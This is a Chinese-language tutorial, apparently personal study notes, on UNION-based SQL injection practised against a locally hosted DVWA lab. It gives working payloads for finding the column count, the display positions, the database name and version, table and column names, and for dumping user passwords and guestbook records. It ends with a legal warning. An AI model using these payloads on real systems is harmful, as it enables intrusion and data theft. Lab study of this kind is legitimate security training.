@@ -1,0 +1,223 @@
+# SQ注入--联合查询注入
+
+# 一、判断漏洞是否存在
+
+  
+根据客户端返回的结果来判断提交的测试语句是否成功被数据引擎执行，如果测试语句被执行了，说明存在注入漏洞
+
+一般利用单引号(')或者双引号(") 来判断是否存在漏洞，如果出现SQL语句错误说明有很大的可能存在漏洞。
+
+访问dvwa靶场，[http://127.0.0.1/dvwa/vulnerabilities/sqli/](http://127.0.0.1/dvwa/vulnerabilities/sqli/) （自己搭建的靶场）此时URL实际想服务器传递了值为1 的变量id，后端向数据库获取数据的上去了语句为：
+    
+    
+    SELECT first_name,lats_name,FROM users WHERE user_id = '$id';
+
+## 判断注入类型：
+
+判断注入类型是数字型还是字符型，这涉及到在注入的过程中是否需要添加单引号，可以使用and（逻辑与）进行判断，当条件表达式两边都为真才是真，有一变为假则是假。
+
+1 and 1=1
+
+1 and 1=2
+
+如果输入“1 and 1=1”和“1 and 1=2”页面查询结果都返回相同的内容，说明不是数字型注入，那就很大概率是字符型注入。
+
+* * *
+
+* * *
+
+仅作案例测试
+
+### 数字型注入：
+    
+    
+    SELECT first_name,last_name FROM users WHERE user_id = 1 and 1=1;
+    SELECT first_name,lats_name FROM users WHERE user_id = 1 and 1=2;
+
+* * *
+
+###  字符型注入：
+    
+    
+    SELECT first_name,last_name FROM users WHERE user_id = '1 and 1=1';
+    SELECT first_name,lats_name FROM users WHERE uesr_id = '1 and 1=2';
+
+* * *
+
+比较两条类型的回显结果：
+
+1、数字型注入回显：
+
+这里两条命令回显结果不一样，而且还有个隐式转换，虽然输入的是2，但后面将2转成了1，不是数字型注入。
+
+注：隐式转换是MySQL中自动调用的，用于实现自动将某种类型的数据转换为另外一种类型的数据。按照上面的例子，user_id是int（整数型），而我们传入的值是'1 and 1=1'是字符串，会触发隐式类型转换。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759544303292-fdea0809-6eab-49f1-9230-a4a29d374a85.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759544363034-84f9c8c7-1dc1-4da1-91d5-0bd589e055dc.png)
+
+2、字符型注入回显：
+
+'1 and 1=1'和'1 and 1=2'回显结果一致，根据特性，要么真要么假（一样就是为真，不一样，则为假）这里得出，是字符型注入。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759544024162-d2cf7d01-388f-4fd1-be07-b6a76a4f52ad.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759544165638-735449d8-9966-4e68-9bad-37b226761b19.png)
+
+# 二、判断表中列数
+
+为了方便后续获取数据，需要先知道查询的表中显示的字段数，可以使用order by来进行判断。ORDER BY*语句用于根据指定的列对结果集进行排序。。
+
+用法：
+
+order by 列名或者order by 列编号
+
+特性：
+
+当order by的数字大于当前列数时候会报错，SQL注入利用这个特性来判断列数。
+
+例题：
+
+还是dvwa靶场的一个SQL注入题，上文已经测试过存在漏洞SQL注入，现在查看这个目标有几列数据，先链接数据库查询看数据，后面是在题目里注入。
+
+注：里面的#号是注释的意思，前面的1'的这个单引号是将里面面的数据闭合，传参。#不好用的话可以换成别的用
+
+## (一) 第一次测试：有一列数据，没报错，接着再试
+
+数据库  
+---  
+卡片1  
+  
+## (二) 第二次测试：没报错，有两列数据了，再试
+
+二次测试-数据库链接  
+---  
+二次测试-题目  
+  
+## (三) 第三次测试：报错了，说明只有两列数据，目的达成
+
+第三次测试-数据库链接查询  
+---  
+第三次测试-题目  
+  
+## (四) 在链接中使用
+
+传入参数的时候，在地址后面用?id=
+    
+    
+    http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27order+by+2%23&Submit=Submit#
+
+'和#在URL（统一资源定位符）中进行了URL编码，'为%27，#为%23，GET型可以用#号的url编码%23或者--+注释掉即可
+    
+    
+    ?id=1%27order+by+2%23&Submit=Submit#   
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759561744886-3787d1e2-11d3-41a5-967b-69fe35b563d4.png)
+
+# 三、确定显示位
+
+**显示位** ：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置教显示位。
+
+**UNION** 操作符用于合并两个或多个SELECT语句的结果集，UNION结果集中的列名总是等于UNION中第一个SELECT语句中的列名，并且UNION内部的SELECT语句必须拥有相同数量的。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同。
+
+示例：
+
+在数据库中查询
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759563121557-5236c8ee-2907-481f-aa11-4ed8b99016b3.png)
+
+题目：
+
+命令：地址/?id=1' union select password,user from users #
+
+单引号和井号以及逗号经过URL编码之后为：
+
+地址[/?id=1%27union+select+password%2Cuser+from+users+%23&Submit=Submit#](http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27union+select+password%2Cuser+from+users+%23&Submit=Submit#)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759563629184-89635e09-c755-49a0-8ab2-e566fc5d9d7c.png)
+
+也可以这样玩~
+
+1' union select 1,2#
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759564143328-be5943fc-0203-4789-a31f-046c1b09d8a1.png)
+
+或者~
+
+-1' union select 1,2#
+
+这个只适用于显示一行的数据情况，查询想要的数据。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759564231894-e53ad4bb-700f-4b61-ab97-6383b9d5d414.png)
+
+# 四、获取数据
+
+## (一) 获取数据据库名称，版本号
+
+还是用dvwa靶场的题玩
+
+1' union select version(),database()#
+
+转译：
+
+地址/?id=1'+union+select+version()%2Cdatabase()%23&Submit=Submit#
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759564670873-3b37e554-7526-4473-9603-65c2baa07f18.png)
+
+## (二) 获取数据库表名  
+
+-1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#
+
+如果不对就用这个
+
+-1' union select 1,convert(table_name using latin1) from information_schema.tables where table_schema='dvwa'#
+
+第一条命令的含义即为：
+
+在-1返回空结果id，不存在的数据。1是占位符，替代里第一列的列名（不知道列名的情况下），第二个是要查询的表的名称，information_schema.tables表里面存储则数据库的元数据，查询dvwa数据库下的信息。
+
+第二天命令同上，只不过中间是将字符集强制转换了一下，因为报错了。。。
+
+查到两张表，一张访客留言表，一张用户表
+
+guestbook
+
+users
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759567416902-7414e78e-aec8-447c-a103-fb94bef166af.png)
+
+## (三) 获取某个表中的字段名
+
+第一条命令：
+
+-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='guestbook'#
+
+第二条命令：  
+如果第一天命令报错了，就用第二个，还是字符集不符合的问题，强制转换了一下。
+
+-1' union select 1,convert(group_concat(column_name) using latin1) from information_schema.columns where table_name='guestbook'#
+
+group_concat的作用是用来将多行信息输出为一行信息。
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759569102253-e84dd315-d239-4c6b-a66a-7d20b07064f1.png)
+
+## (四) 获取字段中的记录
+
+做到
+
+-1' union select 1,group_concat(comment_id,comment,name) from guestbook#
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759570030726-dd20b566-4d2a-453d-8643-0f0e780efdd2.png)
+
+或者只看comment和name
+
+-1' union select comment,name from guestbook#
+
+![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759570293288-1e129f93-b810-4bed-891d-9c207b507754.png)
+
+# 五、注意！！！
+
+正常来说，做到查看数据库名称和版本号就差不多了，就代表有漏洞，再深入的话，修改数据库或者删除数据库，是违反法律的！！！！！
+
+---
+*迁移自语雀文档，原始ID: sypm306txuinkcu3*
